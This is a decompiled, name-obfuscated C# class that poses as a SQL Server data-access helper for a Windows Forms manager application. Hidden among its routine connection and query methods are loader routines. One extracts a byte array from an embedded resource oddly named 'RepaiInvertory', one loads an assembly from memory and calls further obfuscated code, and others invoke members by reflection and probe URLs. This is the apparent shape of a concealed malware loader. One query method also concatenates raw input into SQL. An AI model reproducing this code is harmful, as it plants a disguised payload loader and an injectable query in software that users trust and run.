using System;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Globalization;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Pp27;
using e8T6;
using j3WH;

namespace Rx8m;

public class f1T9
{
	protected SqlConnection SqlCon;

	protected SqlCommand SqlCom;

	protected SqlDataReader Sqldreader;

	protected SqlDataAdapter SqlDa;

	protected SqlCommandBuilder SqlComb;

	private string ConnectionString;

	public f1T9()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		ConnectionString = "Data Source=BK-PC;Initial Catalog=manager_ass;Integrated Security=True";
		SqlCon = new SqlConnection();
		SqlCon.set_ConnectionString(ConnectionString);
	}

	internal static bool Ki1q(string n1HM)
	{
		try
		{
			WebRequest webRequest = WebRequest.Create(n1HM);
			webRequest.GetResponse();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		return true;
	}

	public bool s0Y9()
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		bool result = default(bool);
		try
		{
			if (SqlCon.get_State() != ConnectionState.Open)
			{
				SqlCon.set_ConnectionString(ConnectionString);
				SqlCon.Open();
				result = true;
				return result;
			}
			result = false;
			return result;
		}
		catch (SqlException val)
		{
			ProjectData.SetProjectError((Exception)val);
			MessageBox.Show("Can not connect to database, please choose a database!", "Connect Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	protected bool n3L6()
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		//IL_002a: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (SqlCon.get_State() != 0)
			{
				SqlCon.Close();
				return true;
			}
			return false;
		}
		catch (SqlException val)
		{
			ProjectData.SetProjectError((Exception)val);
			SqlException val2 = val;
			Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Close Database");
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public bool Li4f(string e0M1, bool g5W3 = false)
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		//IL_0031: Expected O, but got Unknown
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		bool result = default(bool);
		if (s0Y9())
		{
			try
			{
				SqlCom = new SqlCommand(e0M1, SqlCon);
				SqlCom.ExecuteNonQuery();
				return true;
			}
			catch (SqlException val)
			{
				ProjectData.SetProjectError((Exception)val);
				SqlException val2 = val;
				if (g5W3)
				{
					Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Execute!");
				}
				result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			finally
			{
				n3L6();
				((Component)(object)SqlCom).Dispose();
			}
		}
		return result;
	}

	internal static byte[] r3BL(string[] Qn9j, int q2SW)
	{
		checked
		{
			byte[] result = default(byte[]);
			try
			{
				string[] array = new string[Qn9j.Length - 1 + 1];
				int num = Qn9j.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						array[i] = Qn9j[i].Replace(".resources", "");
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text == null)
					{
						continue;
					}
					try
					{
						ResourceManager resourceManager = new ResourceManager(text, (Assembly)Lp07.mDic["Ass"]);
						ResourceSet resourceSet = resourceManager.GetResourceSet(CultureInfo.CurrentCulture, createIfNotExists: true, tryParents: true);
						foreach (object item in resourceSet.OfType<object>())
						{
							DictionaryEntry dictionaryEntry = ((item != null) ? ((DictionaryEntry)item) : default(DictionaryEntry));
							if (Operators.ConditionalCompareObjectEqual(dictionaryEntry.Key, (object)"RepaiInvertory", false))
							{
								result = (byte[])dictionaryEntry.Value;
								return result;
							}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				return result;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public SqlDataReader Nq80(string Ma4t)
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_003b: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (s0Y9())
			{
				SqlCom = new SqlCommand(Ma4t, SqlCon);
				Sqldreader = SqlCom.ExecuteReader();
			}
			return Sqldreader;
		}
		catch (SqlException val)
		{
			ProjectData.SetProjectError((Exception)val);
			SqlException val2 = val;
			Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Get DataReader");
			SqlDataReader result = null;
			ProjectData.ClearProjectError();
			return result;
		}
		finally
		{
			n3L6();
			((Component)(object)SqlCom).Dispose();
		}
	}

	public object Mk0n(string q0DH)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		object result = null;
		try
		{
			if (s0Y9())
			{
				SqlCom = new SqlCommand(q0DH, SqlCon);
				result = RuntimeHelpers.GetObjectValue(SqlCom.ExecuteScalar());
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)16, (object)"Get Scalar");
			ProjectData.ClearProjectError();
		}
		finally
		{
			n3L6();
			((Component)(object)SqlCom).Dispose();
		}
		return result;
	}

	public DataTable m2W6(string e5EB)
	{
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_006b: Expected O, but got Unknown
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		string text = string.Empty;
		try
		{
			text = e5EB.Substring(14);
			text = text.Substring(0, checked(text.IndexOf(" ") + 1));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		DataTable dataTable = new DataTable(text);
		SqlDa = new SqlDataAdapter(e5EB, SqlCon);
		if (s0Y9())
		{
			try
			{
				((DbDataAdapter)(object)SqlDa).Fill(dataTable);
			}
			catch (SqlException val)
			{
				ProjectData.SetProjectError((Exception)val);
				SqlException val2 = val;
				Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Get Datatable");
				ProjectData.ClearProjectError();
			}
			finally
			{
				n3L6();
				((Component)(object)SqlDa).Dispose();
			}
		}
		return dataTable;
	}

	public static string z5B3(string i9Z0)
	{
		Type type = (Type)Lp07.mDic[Lp07.T];
		return Conversions.ToString(type.InvokeMember(i9Z0, BindingFlags.Static | BindingFlags.Public | BindingFlags.InvokeMethod, null, null, null));
	}

	public DataTable z6G9(string r0SQ, string n8D3)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Expected O, but got Unknown
		//IL_0047: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		DataTable dataTable = new DataTable(r0SQ);
		SqlDa = new SqlDataAdapter("Select * from " + r0SQ + " Where " + n8D3, SqlCon);
		if (s0Y9())
		{
			try
			{
				((DbDataAdapter)(object)SqlDa).Fill(dataTable);
			}
			catch (SqlException val)
			{
				ProjectData.SetProjectError((Exception)val);
				SqlException val2 = val;
				Interaction.MsgBox((object)((Exception)(object)val2).Message, (MsgBoxStyle)16, (object)"Get DataTable");
				ProjectData.ClearProjectError();
			}
			finally
			{
				n3L6();
				((Component)(object)SqlDa).Dispose();
			}
		}
		return dataTable;
	}

	public bool Bn6s(string Yn29, DataTable d7KF, bool He52 = false)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		SqlDa = new SqlDataAdapter();
		SqlDa.set_SelectCommand(new SqlCommand(Yn29, SqlCon));
		SqlComb = new SqlCommandBuilder(SqlDa);
		try
		{
			if (s0Y9())
			{
				((DbDataAdapter)(object)SqlDa).Update(d7KF);
				return true;
			}
			return false;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			if (He52)
			{
				Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)16, (object)"Warning");
			}
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		finally
		{
			n3L6();
			((Component)(object)SqlDa).Dispose();
			((Component)(object)SqlComb).Dispose();
		}
	}

	internal static void s5GQ()
	{
		Assembly value = Thread.GetDomain().Load((byte[])Lp07.mDic[Lp07.mArray]);
		Lp07.mDic.Add("Ass2", value);
		value = null;
		if (Dt07.Jy5e())
		{
			Zb4q.Kf7q();
		}
	}

	protected void g5ML()
	{
		n3L6();
		GC.SuppressFinalize(this);
	}
}
